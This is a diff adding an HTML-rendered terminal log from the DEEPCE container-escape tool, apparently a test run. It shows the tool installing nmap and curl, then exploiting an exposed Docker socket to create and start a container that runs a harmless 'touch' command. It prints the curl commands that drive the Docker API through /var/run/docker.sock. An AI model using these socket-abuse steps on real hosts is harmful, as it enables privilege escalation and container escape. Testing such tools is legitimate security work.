@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- This file was created with the aha Ansi HTML Adapter. https://github.com/theZiz/aha -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="application/xml+xhtml; charset=UTF-8" />
+<title>results/docker-alpine-payload-command.log</title>
+</head>
+<body style="color:white; background-color:black">
+<pre>
+
+<span style="font-weight:bold;">                      ##</span><span style="color:white;font-weight:bold;">         .
+                ## ## ##        ==
+             ## ## ## ##       ===
+         /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
+</span><span style="color:#3333FF;font-weight:bold;">    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  </span><span style="color:white;font-weight:bold;">===-</span><span style="color:#3333FF;font-weight:bold;"> ~~~</span>
+<span style="font-weight:bold;">         \______ X           __/
+           \    \         __/
+            \____\_______/</span>
+          __                        
+     ____/ /__  ___  ____  ________ 
+    / __  / _ \/ _ \/ __ \/ ___/ _ \ <span style="font-weight:bold;">  ENUMERATE</span>
+   / /_/ /  __/  __/ /_/ / (__/  __/ <span style="font-weight:bold;"> ESCALATE</span>
+   \__,_/\___/\___/ .___/\___/\___/<span style="font-weight:bold;">  ESCAPE</span>
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+  
+<span style="color:#3333FF;font-weight:bold;">===================================</span><span style="color:lime;font-weight:bold;">( Installing Packages )</span><span style="color:#3333FF;font-weight:bold;">====================================</span>
+fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
+fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
+(1/25) Installing fstrm (0.6.0-r1)
+(2/25) Installing libgcc (9.3.0-r2)
+(3/25) Installing krb5-conf (1.0-r2)
+(4/25) Installing libcom_err (1.45.6-r0)
+(5/25) Installing keyutils-libs (1.6.1-r1)
+(6/25) Installing libverto (0.3.1-r1)
+(7/25) Installing krb5-libs (1.18.2-r0)
+(8/25) Installing json-c (0.14-r1)
+(9/25) Installing libstdc++ (9.3.0-r2)
+(10/25) Installing libprotobuf (3.12.2-r0)
+(11/25) Installing libprotoc (3.12.2-r0)
+(12/25) Installing protobuf-c (1.3.3-r1)
+(13/25) Installing xz-libs (5.2.5-r0)
+(14/25) Installing libxml2 (2.9.10-r4)
+(15/25) Installing bind-libs (9.14.12-r0)
+(16/25) Installing bind-tools (9.14.12-r0)
+(17/25) Installing ca-certificates (20191127-r4)
+(18/25) Installing nghttp2-libs (1.41.0-r0)
+(19/25) Installing libcurl (7.69.1-r0)
+(20/25) Installing curl (7.69.1-r0)
+(21/25) Installing lua5.3-libs (5.3.5-r6)
+(22/25) Installing libpcap (1.9.1-r2)
+(23/25) Installing pcre (8.44-r0)
+(24/25) Installing libssh2 (1.9.0-r1)
+(25/25) Installing nmap (7.80-r2)
+Executing busybox-1.31.1-r16.trigger
+Executing ca-certificates-20191127-r4.trigger
+OK: 32 MiB in 39 packages
+<span style="color:#3333FF;font-weight:bold;">=====================================</span><span style="color:lime;font-weight:bold;">( Exploiting Sock )</span><span style="color:#3333FF;font-weight:bold;">======================================</span>
+
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Preparing Exploit </span><span style="font-weight:bold;"> </span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit Type ............. </span><span style="font-weight:bold;">Custom Command</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Custom Command ........... </span><span style="font-weight:bold;">touch /tmp/deepce-docker-alpine-payload-command.hacked</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Clean up ................. </span><span style="font-weight:bold;">Automatic on container exit</span>
+
+{&quot;Id&quot;:&quot;7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f&quot;,&quot;Warnings&quot;:[]}
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> If the shell dies you can restart your listener and run the start command to fire it again </span>
+<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f/start</span>
+<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f/logs?stderr=1&amp;stdout=1&quot; --output -</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Once complete remember to tidy up by stopping and removing your container with following commands </span>
+<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f/stop</span>
+<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/7bfe07b499fabb648ca6619a5f17f404d5781bf645f773a2742013b4b1e5891f</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Starting container ..... </span><span style="color:yellow;font-weight:bold;">Success</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sleeping for ........... </span><span style="font-weight:bold;">2s</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Fetching logs .......... </span><span style="color:yellow;font-weight:bold;">Success</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit completed ..... </span><span style="color:yellow;font-weight:bold;">:)</span>
+<span style="color:#3333FF;font-weight:bold;">===============================================</span><span style="color:lime;font-weight:bold;"></span><span style="color:#3333FF;font-weight:bold;">===============================================</span>
+</pre>
+</body>
+</html>
